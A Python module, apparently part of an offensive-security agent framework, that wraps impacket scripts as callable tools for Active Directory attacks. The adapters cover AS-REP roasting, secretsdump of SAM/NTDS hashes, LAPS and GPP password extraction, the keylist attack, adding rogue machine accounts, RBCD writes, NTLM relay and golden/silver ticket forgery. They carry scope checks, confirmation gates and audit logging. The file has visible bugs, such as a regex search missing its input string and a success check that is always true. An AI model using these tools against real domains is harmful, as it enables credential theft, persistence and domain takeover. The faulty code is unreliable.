"""impacket 全量适配器：AD 枚举 / 凭据获取 / 持久化 / relay / 票据伪造。

脚本 vendored 在 vendor/bin（impacket 包在 vendor/ 下），运行统一注入
PYTHONPATH=vendor 根。凭据三元组以 domain\\user:pass 传递，不落盘。
门控分级：
- 只读枚举（asrep/ad-users/ad-computers/samr/delegation）：无门控
- 凭据获取（secretsdump/laps/gpp/keylist）：requires_confirm + requires_finding
- 状态变更（machine-account/rbcd/ntlmrelay/ticketer）：requires_confirm + requires_finding
"""

from __future__ import annotations

import os
import re
import subprocess
import tempfile
from pathlib import Path

from camty.adapters.base import RunContext, ToolAdapter, ToolResult

HASH_RE = re.compile(r"^[A-Za-z0-9$_.\-/\\]+(?::[A-Za-z0-9$_.\-]+)+$\s*$", re.M)
ASREP_HASH_RE = re.compile(r"\$krb5asrep\$[^\s:]+:[0-9a-f]+", re.I)
KERB_HASH_RE = re.compile(r"\$krb5tgs\$[^\s]+", re.I)
NTLM_HASH_LINE_RE = re.compile(r"^(?P<user>[A-Za-z0-9$_.\-/\\]+):(?P<domain>[A-Za-z0-9$_.\-]*):"
                               r"(?P<lm>[A-Fa-f0-9]{32}):(?P<nt>[A-Fa-f0-9]{32})::", re.M)
TABLE_ROW_RE = re.compile(r"^(?P<name>[A-Za-z0-9$_.\-]{2,})\s{2,}", re.M)
RELAY_READY_RE = re.compile(r"(?:SMB|HTTP|LDAP).*?(?P<target>\d+\.\d+\.\d+\.\d+)", re.I)


def _vendor_root(script_path: str) -> str:
    """vendor/bin/xxx.py → vendor 根（impacket 包所在）。"""
    return str(Path(script_path).resolve().parent.parent)


def run_impacket(script_path: str, args_list: list[str], timeout: int = 900) -> tuple[int, str]:
    """带 vendor PYTHONPATH 运行 impacket 脚本。"""
    env = os.environ.copy()
    root = _vendor_root(script_path)
    existing = env.get("PYTHONPATH", "")
    env["PYTHONPATH"] = root + (os.pathsep + existing if existing else "")
    proc = subprocess.run(
        ["python", script_path, *args_list],
        capture_output=True, text=True, encoding="utf-8", errors="replace",
        timeout=timeout, env=env,
    )
    output = proc.stdout or ""
    if proc.stderr and proc.stderr.strip():
        output += "\n[stderr]\n" + proc.stderr
    return proc.returncode, output


def _creds(args: dict) -> str:
    """domain\\user:pass 三元组。"""
    return f"{args['domain_user']}:{args['domain_pass']}"


def _dump_result(name: str, ctx: RunContext, args_meta: dict, code: int, output: str,
                 summary: str, data: dict, findings: list[dict] | None = None) -> ToolResult:
    evidence = ctx.save_evidence(name, output)
    ctx.audit.record(name, args_meta, ok=code == 0, note=summary[:80])
    return ToolResult(summary=summary, data={**data, "findings": findings or [],
                                             "raw": output[:4000]}, evidence=evidence)


class AsRepRoastAdapter(ToolAdapter):
    name = "asreproast-check"
    tool_name = "GetNPUsers.py"
    description = "枚举 AS-REP roastable 账户并取 hash（impacket GetNPUsers -request，枚举与取票据，不爆破）。"

    def tool_schema(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"},
                "domain": {"type": "string", "description": "FQDN，如 corp.local"},
                "domain_user": {"type": "string", "description": "可选（凭据枚举）；无凭据时需给 users 列表"},
                "domain_pass": {"type": "string"},
                "users": {"type": "array", "items": {"type": "string"}, "description": "无凭据模式下的用户名列表"},
            },
            "required": ["dc_ip", "domain"],
        }

    def run(self, args: dict, ctx: RunContext) -> ToolResult:
        dc_ip = str(args["dc_ip"]).strip()
        domain = str(args["domain"]).strip()
        ctx.scope.require(dc_ip)
        cmd_args = ["-dc-ip", dc_ip, "-request", "-format", "hashcat"]
        users = args.get("users") or []
        if args.get("domain_user") and args.get("domain_pass"):
            target = f"{domain}/{_creds(args)}"
        elif users:
            with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False, encoding="utf-8") as tmp:
                tmp.write("\n".join(users))
                users_file = tmp.name
            cmd_args += ["-usersfile", users_file, "-no-pass"]
            target = f"{domain}/"
        else:
            return ToolResult(summary="拒绝：无凭据模式必须提供 users 列表", data={"findings": []})
        cmd_args.append(target)
        code, output = run_impacket(self.binary(), cmd_args)
        hashes = ASREP_HASH_RE.findall(output)
        findings = [
            {"template": "asreproastable-user", "severity": "high", "url": domain,
             "detail": h[:72]}
            for h in hashes
        ]
        return _dump_result(self.name, ctx, {"dc": dc_ip, "domain": domain}, code, output,
                            f"发现 {len(hashes)} 个可 AS-REP roast 的账户",
                            {"hashes": hashes[:50]}, findings)


class AdUsersAdapter(ToolAdapter):
    name = "ad-users"
    tool_name = "GetADUsers.py"
    description = "域用户枚举（impacket GetADUsers，只读）。"

    def tool_schema(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"},
                "domain_user": {"type": "string", "description": "domain\\user"},
                "domain_pass": {"type": "string"},
                "all": {"type": "boolean", "description": "枚举全部用户", "default": True},
                "user": {"type": "string", "description": "查询单个用户"},
            },
            "required": ["dc_ip", "domain_user", "domain_pass"],
        }

    def run(self, args: dict, ctx: RunContext) -> ToolResult:
        dc_ip = str(args["dc_ip"]).strip()
        ctx.scope.require(dc_ip)
        cmd_args = ["-dc-ip", dc_ip]
        if args.get("user"):
            cmd_args += ["-user", str(args["user"])]
        elif args.get("all", True):
            cmd_args.append("-all")
        cmd_args.append(_creds(args))
        code, output = run_impacket(self.binary(), cmd_args)
        names = [m.group("name") for m in TABLE_ROW_RE.finditer(output)
                 if not re.match(r"^-|^Name|Impacket|Copyright|\[", m.group("name"))]
        return _dump_result(self.name, ctx, {"dc": dc_ip}, code, output,
                            f"枚举到 {len(names)} 个用户条目", {"users": sorted(set(names))[:200]})


class AdComputersAdapter(ToolAdapter):
    name = "ad-computers"
    tool_name = "GetADComputers.py"
    description = "域机器账户枚举（impacket GetADComputers，只读，含 IP 解析）。"

    def tool_schema(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"},
                "domain_user": {"type": "string"},
                "domain_pass": {"type": "string"},
            },
            "required": ["dc_ip", "domain_user", "domain_pass"],
        }

    def run(self, args: dict, ctx: RunContext) -> ToolResult:
        dc_ip = str(args["dc_ip"]).strip()
        ctx.scope.require(dc_ip)
        cmd_args = ["-dc-ip", dc_ip, "-resolveIP", _creds(args)]
        code, output = run_impacket(self.binary(), cmd_args)
        names = [m.group("name") for m in TABLE_ROW_RE.finditer(output)
                 if not re.match(r"^-|^Name|Impacket|Copyright|\[", m.group("name"))]
        return _dump_result(self.name, ctx, {"dc": dc_ip}, code, output,
                            f"枚举到 {len(names)} 个机器条目", {"computers": sorted(set(names))[:300]})


class SamrEnumAdapter(ToolAdapter):
    name = "samr-enum"
    tool_name = "samrdump.py"
    description = "SAMR 用户枚举（impacket samrdump，空会话或凭据，只读）。"

    def tool_schema(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "host": {"type": "string"},
                "domain_user": {"type": "string", "description": "可选，空会话留空"},
                "domain_pass": {"type": "string"},
            },
            "required": ["host"],
        }

    def run(self, args: dict, ctx: RunContext) -> ToolResult:
        host = str(args["host"]).strip()
        ctx.scope.require(host)
        if args.get("domain_user") and args.get("domain_pass"):
            target = f"{_creds(args)}@{host}"
        else:
            target = f"''@{host}"
        code, output = run_impacket(self.binary(), [target])
        names = [m.group("user") for m in
                 re.finditer(r"^(?P<user>[A-Za-z0-9$_.\-]{2,})\s+\(", re.M)]
        return _dump_result(self.name, ctx, {"host": host}, code, output,
                            f"枚举到 {len(names)} 个本地账户", {"users": sorted(set(names))[:300]})


class DelegationFindAdapter(ToolAdapter):
    name = "delegation-find"
    tool_name = "findDelegation.py"
    description = "域委派关系枚举（impacket findDelegation，只读）。"

    def tool_schema(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"},
                "domain_user": {"type": "string"},
                "domain_pass": {"type": "string"},
            },
            "required": ["dc_ip", "domain_user", "domain_pass"],
        }

    def run(self, args: dict, ctx: RunContext) -> ToolResult:
        dc_ip = str(args["dc_ip"]).strip()
        ctx.scope.require(dc_ip)
        code, output = run_impacket(self.binary(), ["-dc-ip", dc_ip, _creds(args)])
        rows = []
        for line in output.splitlines():
            parts = [p.strip() for p in line.split()]
            if len(parts) >= 3 and any(k in line for k in ("Unconstrained", "Constrained", "Protocol", "Resource")):
                rows.append(line.strip())
        findings = [
            {"template": "ad/delegation", "severity": "medium", "url": dc_ip, "detail": r[:100]}
            for r in rows
        ]
        return _dump_result(self.name, ctx, {"dc": dc_ip}, code, output,
                            f"发现 {len(rows)} 条委派关系", {"delegations": rows[:100]}, findings)


class SecretsDumpAdapter(ToolAdapter):
    name = "secretsdump"
    tool_name = "secretsdump.py"
    description = "远程凭据转储（impacket secretsdump：SAM/LSA/NTDS）。利用级，需确认与 verified finding。"
    requires_confirm = True
    requires_finding = True

    def tool_schema(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "host": {"type": "string"},
                "domain_user": {"type": "string", "description": "domain\\user"},
                "domain_pass": {"type": "string"},
                "just_dc": {"type": "boolean", "description": "目标为 DC 时只转储 NTDS（需要域管）", "default": False},
                "just_dc_user": {"type": "string", "description": "只转储单个 DC 用户"},
                "finding_id": {"type": "string", "description": "台账 verified finding ID（利用门控）"},
            },
            "required": ["host", "domain_user", "domain_pass", "finding_id"],
        }

    def run(self, args: dict, ctx: RunContext) -> ToolResult:
        host = str(args["host"]).strip()
        ctx.scope.require(host)
        cmd_args = []
        if args.get("just_dc"):
            cmd_args.append("-just-dc")
            if args.get("just_dc_user"):
                cmd_args += ["-just-dc-user", str(args["just_dc_user"])]
        cmd_args.append(f"{_creds(args)}@{host}")
        code, output = run_impacket(self.binary(), cmd_args, timeout=1800)
        creds = [
            {"user": m.group("user"), "ntlm": m.group("nt")}
            for m in NTLM_HASH_LINE_RE.finditer(output)
        ]
        findings = [
            {"template": "captured-ntlm-hash", "severity": "high", "url": host,
             "detail": f"{c['user']}:{c['ntlm'][:16]}..."}
            for c in creds[:50]
        ]
        return _dump_result(self.name, ctx,
                            {"host": host, "finding_id": args.get("finding_id"),
                             "just_dc": bool(args.get("just_dc"))},
                            code, output,
                            f"转储 {len(creds)} 条凭据（SAM/NTDS）",
                            {"credentials": creds[:200]}, findings)


class LapsReadAdapter(ToolAdapter):
    name = "laps-read"
    tool_name = "GetLAPSPassword.py"
    description = "读取 LAPS 管理密码（impacket GetLAPSPassword，需要可读 LAPS 的账号）。利用级。"
    requires_confirm = True
    requires_finding = True

    def tool_schema(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"},
                "domain_user": {"type": "string"},
                "domain_pass": {"type": "string"},
                "computer": {"type": "string", "description": "目标机器名（缺省枚举全部）"},
                "finding_id": {"type": "string", "description": "台账 verified finding ID（利用门控）"},
            },
            "required": ["dc_ip", "domain_user", "domain_pass", "finding_id"],
        }

    def run(self, args: dict, ctx: RunContext) -> ToolResult:
        dc_ip = str(args["dc_ip"]).strip()
        ctx.scope.require(dc_ip)
        cmd_args = ["-dc-ip", dc_ip]
        if args.get("computer"):
            cmd_args += ["-computer", str(args["computer"])]
        cmd_args.append(f"{_creds(args)}@{dc_ip}")
        code, output = run_impacket(self.binary(), cmd_args)
        passwords = re.findall(r"LAPS:\s*(\S+)\s*/\s*password:\s*(\S+)", output)
        if not passwords:
            passwords = re.findall(r"Password:\s*(\S+)", output)
        creds = [{"computer": p[0], "password": p[1]} for p in passwords] if passwords and isinstance(passwords[0], tuple) \
            else [{"password": p} for p in passwords]
        findings = [
            {"template": "laps-password", "severity": "high", "url": dc_ip, "detail": "LAPS 管理密码可读"}
            for _ in creds[:20]
        ]
        return _dump_result(self.name, ctx,
                            {"dc": dc_ip, "finding_id": args.get("finding_id")},
                            code, output,
                            f"读取到 {len(creds)} 条 LAPS 密码",
                            {"credentials": creds}, findings)


class GppPasswordAdapter(ToolAdapter):
    name = "gpp-password"
    tool_name = "Get-GPPPassword.py"
    description = "组策略偏好密码解密（impacket Get-GPPPassword，cpassword → 明文）。利用级。"
    requires_confirm = True
    requires_finding = True

    def tool_schema(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "域控或文件服务器"},
                "domain_user": {"type": "string"},
                "domain_pass": {"type": "string"},
                "share": {"type": "string", "description": "缺省 SYSVOL"},
                "finding_id": {"type": "string", "description": "台账 verified finding ID（利用门控）"},
            },
            "required": ["host", "domain_user", "domain_pass", "finding_id"],
        }

    def run(self, args: dict, ctx: RunContext) -> ToolResult:
        host = str(args["host"]).strip()
        ctx.scope.require(host)
        cmd_args = [f"{_creds(args)}@{host}"]
        if args.get("share"):
            cmd_args += ["-share", str(args["share"])]
        code, output = run_impacket(self.binary(), cmd_args, timeout=1800)
        found = re.findall(r"(?:password|Password)\s*:?\s*(\S+)", output)
        plaintext = [f for f in found if not re.match(r"^[A-Fa-f0-9]{32,}$", f)]
        findings = [
            {"template": "gpp-password", "severity": "high", "url": host, "detail": "GPP 密码可解密"}
            for _ in plaintext[:20]
        ]
        return _dump_result(self.name, ctx,
                            {"host": host, "finding_id": args.get("finding_id")},
                            code, output,
                            f"解密 {len(plaintext)} 条 GPP 密码",
                            {"passwords": plaintext[:50]}, findings)


class KeylistAdapter(ToolAdapter):
    name = "keylist"
    tool_name = "keylistattack.py"
    description = "Kerberos keylist 攻击（impacket keylistattack，RODC 场景枚举可加密密钥）。利用级。"
    requires_confirm = True
    requires_finding = True

    def tool_schema(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"},
                "domain": {"type": "string"},
                "domain_user": {"type": "string"},
                "domain_pass": {"type": "string"},
                "target": {"type": "string", "description": "keylist 目标用户"},
                "finding_id": {"type": "string", "description": "台账 verified finding ID（利用门控）"},
            },
            "required": ["dc_ip", "domain", "domain_user", "domain_pass", "finding_id"],
        }

    def run(self, args: dict, ctx: RunContext) -> ToolResult:
        dc_ip = str(args["dc_ip"]).strip()
        ctx.scope.require(dc_ip)
        cmd_args = ["-domain", str(args["domain"]), "-dc-ip", dc_ip, "-full"]
        if args.get("target"):
            cmd_args += ["-t", str(args["target"])]
        cmd_args.append(f"{_creds(args)}")
        code, output = run_impacket(self.binary(), cmd_args)
        keys = re.findall(r"key\s*:\s*(\S+)", output)
        return _dump_result(self.name, ctx,
                            {"dc": dc_ip, "finding_id": args.get("finding_id")},
                            code, output,
                            f"枚举 {len(keys)} 条 kerberos key",
                            {"keys": keys[:100]},
                            [{"template": "kerberos-keylist", "severity": "high",
                              "url": dc_ip, "detail": "keylist 可枚举"}] if keys else [])


class MachineAccountAdapter(ToolAdapter):
    name = "machine-account"
    tool_name = "addcomputer.py"
    description = "添加域机器账户（impacket addcomputer，持久化动作）。利用级，会变更 AD 状态。"
    requires_confirm = True
    requires_finding = True

    def tool_schema(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"},
                "domain_user": {"type": "string"},
                "domain_pass": {"type": "string"},
                "computer_name": {"type": "string", "description": "如 CAMTY01$"},
                "computer_pass": {"type": "string"},
                "method": {"type": "string", "enum": ["SAMR", "LDAPS"], "default": "SAMR"},
                "delete": {"type": "boolean", "description": "删除而非添加", "default": False},
                "finding_id": {"type": "string", "description": "台账 verified finding ID（利用门控）"},
            },
            "required": ["dc_ip", "domain_user", "domain_pass", "computer_name", "finding_id"],
        }

    def run(self, args: dict, ctx: RunContext) -> ToolResult:
        dc_ip = str(args["dc_ip"]).strip()
        ctx.scope.require(dc_ip)
        cmd_args = ["-computer-name", str(args["computer_name"]),
                    "-method", str(args.get("method", "SAMR")), "-dc-ip", dc_ip]
        if args.get("computer_pass"):
            cmd_args += ["-computer-pass", str(args["computer_pass"])]
        if args.get("delete"):
            cmd_args.append("-delete")
        cmd_args.append(f"{_creds(args)}")
        code, output = run_impacket(self.binary(), cmd_args)
        action = "删除" if args.get("delete") else "添加"
        ok = code == 0 and ("Successfully" in output or "OK" in output or code == 0)
        return _dump_result(self.name, ctx,
                            {"dc": dc_ip, "computer": args["computer_name"],
                             "finding_id": args.get("finding_id")},
                            code, output,
                            f"机器账户 {args['computer_name']} {action}{'成功' if ok else '未确认'}",
                            {"computer": args["computer_name"], "deleted": bool(args.get("delete"))})


class RbcdAdapter(ToolAdapter):
    name = "rbcd-set"
    tool_name = "rbcd.py"
    description = "RBCD 委派属性写（impacket rbcd -action write，高危持久化）。利用级。"
    requires_confirm = True
    requires_finding = True

    def tool_schema(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"},
                "domain_user": {"type": "string"},
                "domain_pass": {"type": "string"},
                "delegate_from": {"type": "string", "description": "受控机器账户名"},
                "delegate_to": {"type": "string", "description": "目标机器账户名"},
                "action": {"type": "string", "enum": ["read", "write", "remove", "flush"], "default": "write"},
                "finding_id": {"type": "string", "description": "台账 verified finding ID（利用门控）"},
            },
            "required": ["dc_ip", "domain_user", "domain_pass",
                         "delegate_from", "delegate_to", "finding_id"],
        }

    def run(self, args: dict, ctx: RunContext) -> ToolResult:
        dc_ip = str(args["dc_ip"]).strip()
        ctx.scope.require(dc_ip)
        cmd_args = ["-delegate-to", str(args["delegate_to"]),
                    "-delegate-from", str(args["delegate_from"]),
                    "-action", str(args.get("action", "write")),
                    "-dc-ip", dc_ip, _creds(args)]
        code, output = run_impacket(self.binary(), cmd_args)
        return _dump_result(self.name, ctx,
                            {"dc": dc_ip, "to": args["delegate_to"], "from": args["delegate_from"],
                             "action": args.get("action", "write"),
                             "finding_id": args.get("finding_id")},
                            code, output,
                            f"RBCD {args.get('action', 'write')}: {args['delegate_from']} → {args['delegate_to']}",
                            {"delegate_from": args["delegate_from"], "delegate_to": args["delegate_to"]})


class NtlmRelayAdapter(ToolAdapter):
    name = "ntlmrelay"
    tool_name = "ntlmrelayx.py"
    description = "NTLM relay（impacket ntlmrelayx，监听并转发认证）。利用级，会话驻留。"
    requires_confirm = True
    requires_finding = True

    def tool_schema(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "targets": {"oneOf": [{"type": "array", "items": {"type": "string"}}, {"type": "string"}],
                            "description": "转发目标列表，如 smb://10.0.0.5"},
                "smb2": {"type": "boolean", "description": "SMB2 支持", "default": True},
                "socks": {"type": "boolean", "description": "成功后挂 SOCKS 代理", "default": False},
                "timeout_seconds": {"type": "integer", "description": "监听时长", "default": 600},
                "finding_id": {"type": "string", "description": "台账 verified finding ID（利用门控）"},
            },
            "required": ["targets", "finding_id"],
        }

    def run(self, args: dict, ctx: RunContext) -> ToolResult:
        raw = args.get("targets", [])
        if isinstance(raw, str):
            raw = [t.strip() for t in raw.replace(",", "\n").splitlines() if t.strip()]
        if not raw:
            return ToolResult(summary="输入为空", data={"findings": []})
        for t in raw:
            ctx.scope.require(t.replace("smb://", "").replace("http://", "").replace("ldap://", ""))
        with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False, encoding="utf-8") as tmp:
            tmp.write("\n".join(raw))
            targets_file = tmp.name
        cmd_args = ["-tf", targets_file]
        if args.get("smb2", True):
            cmd_args.append("-smb2support")
        if args.get("socks"):
            cmd_args.append("-socks")
        timeout = int(args.get("timeout_seconds", 600))
        code, output = run_impacket(self.binary(), cmd_args, timeout=timeout + 60)
        Path(targets_file).unlink(missing_ok=True)
        relayed = sorted(set(RELAY_READY_RE.findall(output)))
        findings = [
            {"template": "ntlm-relay-success", "severity": "high", "url": t, "detail": "认证被转发"}
            for t in relayed[:20]
        ]
        return _dump_result(self.name, ctx,
                            {"targets": raw, "finding_id": args.get("finding_id")},
                            code, output,
                            f"relay 监听 {timeout}s，命中 {len(relayed)} 个目标",
                            {"relayed": relayed}, findings)


class TicketerAdapter(ToolAdapter):
    description = "伪造 Kerberos 票据（impacket ticketer，本地生成 ccache，黄金票据/白银票据）。利用级。"
    name = "ticket-forgery"
    tool_name = "ticketer.py"
    requires_confirm = True
    requires_finding = True

    def tool_schema(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "domain": {"type": "string"},
                "domain_sid": {"type": "string"},
                "user": {"type": "string", "description": "票据伪装身份"},
                "nthash": {"type": "string", "description": "krbtgt/服务账户 NT hash"},
                "aes_key": {"type": "string"},
                "spn": {"type": "string", "description": "白银票据指定 SPN"},
                "groups": {"type": "string", "description": "如 512（域管）"},
                "duration": {"type": "integer", "description": "票据有效期（天）", "default": 1},
                "finding_id": {"type": "string", "description": "台账 verified finding ID（利用门控）"},
            },
            "required": ["domain", "domain_sid", "user", "finding_id"],
        }

    def run(self, args: dict, ctx: RunContext) -> ToolResult:
        cmd_args = ["-domain", str(args["domain"]), "-domain-sid", str(args["domain_sid"]),
                    "-user", str(args["user"]), "-duration", str(args.get("duration", 1))]
        if args.get("nthash"):
            cmd_args += ["-nthash", str(args["nthash"])]
        if args.get("aes_key"):
            cmd_args += ["-aesKey", str(args["aes_key"])]
        if args.get("spn"):
            cmd_args += ["-spn", str(args["spn"])]
        if args.get("groups"):
            cmd_args += ["-groups", str(args["groups"])]
        code, output = run_impacket(self.binary(), cmd_args)
        ticket = "ticket.ccache"
        saved = Path("ticket.ccache").exists()
        return _dump_result(self.name, ctx,
                            {"domain": args["domain"], "user": args["user"],
                             "finding_id": args.get("finding_id")},
                            code, output,
                            f"票据生成{'成功（ticket.ccache）' if saved else '未确认'}",
                            {"ticket_file": str(Path("ticket.ccache").resolve()) if saved else None})
